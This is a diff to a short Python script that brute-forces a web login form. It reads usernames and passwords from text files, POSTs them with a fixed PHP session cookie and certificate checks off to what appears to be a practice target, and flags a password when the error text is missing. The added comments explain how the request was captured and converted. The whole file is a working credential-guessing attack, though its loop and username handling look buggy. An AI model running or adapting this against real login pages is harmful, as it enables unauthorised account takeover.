@@ -1,5 +1,9 @@
 import requests
 
+# Got POST Form Type
+# Copied As Curl
+# Converted Curl To Python Requests Online
+
 cookies = {
     'PHPSESSID': 'vjunihkrh0lsunkj7vf9k1ldj5f8j7ed',
 }
@@ -16,9 +20,12 @@ headers = {
     'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,mr;q=0.6,pt;q=0.5',
 }
 
+# Usernames In A List Format
 users = [ x.strip() for x in open('users.txt').read().split('\n') if x ]
+# Passwords In A List Format
 passwords = [x.strip() for x in open('passwords.txt').read().split('\n') if x]
 
+# Looping
 for password in passwords:
     data = {
       'username': users,
@@ -28,5 +35,6 @@ for password in passwords:
 
 response = requests.post('http://grabme.herokuapp.com/target/', headers=headers, cookies=cookies, data=data, verify=False)
 
+# Checking Response To Get Correct Password.
 if "incorrect username or password" not in response.text:
     print("Password Is Likely Found: ", password)
